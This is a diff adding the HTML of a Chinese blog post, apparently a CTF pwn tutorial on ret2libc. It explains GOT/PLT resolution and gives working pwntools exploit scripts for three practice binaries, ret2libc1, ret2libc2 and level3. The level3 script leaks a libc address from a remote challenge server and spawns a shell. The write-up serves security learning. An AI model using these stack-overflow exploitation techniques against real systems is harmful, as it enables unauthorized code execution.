@@ -1,0 +1,182 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ROP之ret2liibc - 赵丰年-全世界都知道我很低调</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="赵丰年,"> 
+    <meta name="description" content="写在前面之前所说的ret2text,ret2shellcode,ret2syscall,都是静态编译的程序，今天聊一聊动态编译的ROP。
+动态编译与静态编译　1、动态编译的可执行文件需要附带一个的动,"> 
+    <meta name="author" content="赵丰年de博客"> 
+    <link rel="alternative" href="atom.xml" title="赵丰年-全世界都知道我很低调" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">赵丰年-全世界都知道我很低调</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="https://xiy-blogs.github.io"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">ROP之ret2liibc</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">ROP之ret2liibc</h1>
+        <div class="stuff">
+            <span>三月 04, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>之前所说的ret2text,ret2shellcode,ret2syscall,都是静态编译的程序，今天聊一聊动态编译的ROP。</p>
+<h2 id="动态编译与静态编译"><a href="#动态编译与静态编译" class="headerlink" title="动态编译与静态编译"></a>动态编译与静态编译</h2><p>　1、动态编译的可执行文件需要附带一个的动态链接库（libc库），在执行时，需要调用其对应动态链接库中的命令。<br>　　所以其优点一方面是缩小了执行文件本身的体积，另一方面是加快了编译速度，节省了系统资源。<br>　　缺点一是哪怕是很简单的程序，只用到了链接库中的一两条命令，也需要附带一个相对庞大的链接库；二是如果其他计算机上没有安装对应的运行库，则用动态编译的可执行文件就不能运行。<br>　　2、静态编译就是编译器在编译可执行文件的时候，将可执行文件需要调用的对应动态链接库(.so)中的部分提取出来，链接到可执行文件中去，使可执行文件在运行的时候不依赖于动态链接库。所以其优缺点与动态编译的可执行文件正好互补。 </p>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容，真实地址)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。在动态编译的程序中真实地址=偏移地址+基地址，不同版本的libc库，其偏移不同，我们我们可以通过libc库版本去寻找每个函数的偏移，泄露已知函数的真实地址去计算其基地址，从而构造出system的函数的真实地址。但在这里，我还是选择用pwntools帮我们做这一切。</p>
+<h2 id="GOT表和PLT表"><a href="#GOT表和PLT表" class="headerlink" title="GOT表和PLT表"></a>GOT表和PLT表</h2><p>在目前的 C 程序中，libc中的函数都是通过 GOT 表来跳转的。通过PLT表作为中间表链接call命令和got表，而got表中的内容是函数的真实地址。在一些pwn题中，要泄漏出的函数地址应该是got表中的内容，为了泄漏这些真正的地址，往往会用到read，write，put等函数，通过已知同时存在于got和libc的函数地址，可以得出偏移量，接着就能通过偏移量找到system函数的真正地址，从而进行ret2libc操作.</p>
+<h2 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h2><h3 id="re2libc1"><a href="#re2libc1" class="headerlink" title="re2libc1"></a><a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1" target="_blank" rel="noopener">re2libc1</a></h3><p>这种题最简单，我们直接分析哈，看下保护机制，开启了NX<br><img src="https://i.loli.net/2020/03/04/hFKLcTWn4xmDzgs.png" alt="f1.png"><br>扔IDA<br><img src="https://i.loli.net/2020/03/04/nhQtZAkpcHFuDgz.png" alt="f2.png"><br>存在一个栈溢出，shift+f12继续康康<br><img src="https://i.loli.net/2020/03/04/1zpFEi5ZTOdjsJc.png" alt="f3.png"><br>发现了”/bin/sh”点进去康康地址<br><img src="https://i.loli.net/2020/03/04/U1OQK6AsdvxFDXV.png" alt="f4.png"><br>继续康，发现了system的地址<br><img src="https://i.loli.net/2020/03/04/5eb96PavHYRICsF.png" alt="f5.png"><br>OK，我们可以通过溢出，跳转到到system函数，执行”/bin/sh”拿shell<br><img src="https://i.loli.net/2020/03/04/mVr6koxcuJzL83I.png" alt="f6.png"><br>偏移为112，开始写exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; process(&#39;ret2libc1&#39;)</span><br><span class="line"></span><br><span class="line">sys_add &#x3D; 0x8048460</span><br><span class="line">sh &#x3D; 0x08048720</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; &#39;a&#39;*112</span><br><span class="line">payload +&#x3D; p32(sys_add)	#覆盖返回地址为system函数</span><br><span class="line">payload +&#x3D; &#39;b&#39;*4	#system的返回地址，随便输，因为之前调用了system(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">payload +&#x3D; p32(sh)	#system函数参数</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>攻防世界的level2也是这样，可以练练</p>
+<h3 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a><a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2" target="_blank" rel="noopener">ret2libc2</a></h3><p>检查保护机制，<br><img src="https://i.loli.net/2020/03/04/oEmvNsaPSxU2BKV.png" alt="f10.png"><br>只开启了NX，扔IDA，分析一波<br><img src="https://i.loli.net/2020/03/04/PQlYcmkVwhRs1GW.png" alt="f11.png"><br>存在栈溢出，有system函数，shift+f12看看<br><img src="https://i.loli.net/2020/03/04/O1siWuDBKzelrC8.png" alt="f12.png"><br>么得’/bin/sh’<br>所以需要我们自己吧它写入.bss段，然后作为参数给system，ok写exp<br>OK，找下.bss段<code>readelf -S ret2libc2 | grep bss</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[25] .bss              NOBITS          0804a040 001040 0000a4 00  WA  0   0 32</span><br><span class="line"></span><br><span class="line">计算出偏移为112</span><br><span class="line">IDA中gets函数地址为0x08048460，说一下我们需要gets函数吧它写入.bss段，然后pop到ebx,给system函数</span><br></pre></td></tr></table></figure>
+<p>ROPgadget –binary ret2libc2 –only ‘pop|ret’| grep ‘ebx’</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;&#96;&#96;</span><br><span class="line">0x0804843d : pop ebx ; ret</span><br></pre></td></tr></table></figure>
+<p>开工</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; process(&#39;ret2libc2&#39;)</span><br><span class="line"></span><br><span class="line">sys_add &#x3D; 0x8048490</span><br><span class="line">gets_add &#x3D; 0x08048460</span><br><span class="line">bss &#x3D; 0x804a040</span><br><span class="line">pop_ret &#x3D; 0x0804843d</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; &#39;a&#39;*112</span><br><span class="line">payload +&#x3D; p32(gets_add)</span><br><span class="line">payload +&#x3D; p32(pop_ret)</span><br><span class="line">payload +&#x3D; p32(bss)</span><br><span class="line">payload +&#x3D; p32(sys_add)</span><br><span class="line">payload +&#x3D; &#39;b&#39;*4</span><br><span class="line">payload +&#x3D; p32(bss)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.sendline(&#39;&#x2F;bin&#x2F;sh\&#39;)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="攻防世界level3"><a href="#攻防世界level3" class="headerlink" title="攻防世界level3"></a>攻防世界level3</h3><p>这道题给了我们libc库，而且告诉我们没有system了，来，分析一下<br>检查保护机制，只开启了NX<br><img src="https://i.loli.net/2020/03/04/FU4XTkN8OEScIZW.png" alt="f12 _1_.png"><br>扔IDA<br><img src="https://i.loli.net/2020/03/04/TS6gYzHfosxuBFq.png" alt="f13.png"><br>看看这个函数的伪代码<br><img src="https://i.loli.net/2020/03/04/d1v8XsShRAoJME2.png" alt="f14.png"><br>存在一个栈溢出，继续shift+f12<br><img src="https://i.loli.net/2020/03/04/W3yOUhkmPEjYI7B.png" alt="f15.png"><br>么的’/bin/sh’,OK,这才像点ret2libc的样子，搞他，我先找找偏移<br><img src="https://i.loli.net/2020/03/04/PCepOQ2BihkouZm.png" alt="f13 _1_.png"><br>我们这里利用write函数泄露<code>write的真实地址</code><br>OK，让脚本说话</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import * #导入LibcSearch模块</span><br><span class="line"></span><br><span class="line">r &#x3D; remote(&#39;111.198.29.45&#39;,51596)</span><br><span class="line">elf &#x3D; ELF(&#39;.&#x2F;level3&#39;)</span><br><span class="line"></span><br><span class="line">write_plt &#x3D; elf.plt[&#39;write&#39;] #要利用的函数</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;] #要泄露的函数的GOT地址，里面的内容即真实地址</span><br><span class="line">main_addr &#x3D; elf.symbols[&#39;main&#39;] #返回地址为main，使其还可溢出</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*140+p32(write_plt)+p32(main_addr)+p32(1)+p32(write_got)+p32(4)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_addr &#x3D; u32(r.recv()[:4]) #发送payload后会接收到write的真实地址</span><br><span class="line"></span><br><span class="line">libc &#x3D; LibcSearcher(&#39;write&#39;,write_addr) #利用LibcSearcher寻找libc版本</span><br><span class="line"></span><br><span class="line">base &#x3D; write_addr - libc.dump(&#39;write&#39;) #.dump为偏移地址</span><br><span class="line"></span><br><span class="line">sys_addr &#x3D; base + libc.dump(&#39;system&#39;)</span><br><span class="line">sh_addr &#x3D; base +libc.dump(&#39;str_bin_sh&#39;)</span><br><span class="line"></span><br><span class="line">payload2 &#x3D; &#39;a&#39;*140 +p32(sys_addr)+&#39;b&#39;*4+p32(sh_addr)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="https://link.hhtjim.com/163/29715487.mp3">
+            </audio>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='9795acb241b5abfffb0a'
+        data-cs='660e7056618084a8a8046e8e2e9e78787cdb23cf'
+        data-r='XIY-blogs.github.io'
+        data-o='XIY-blogs'
+        data-a='XIY-blogs'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
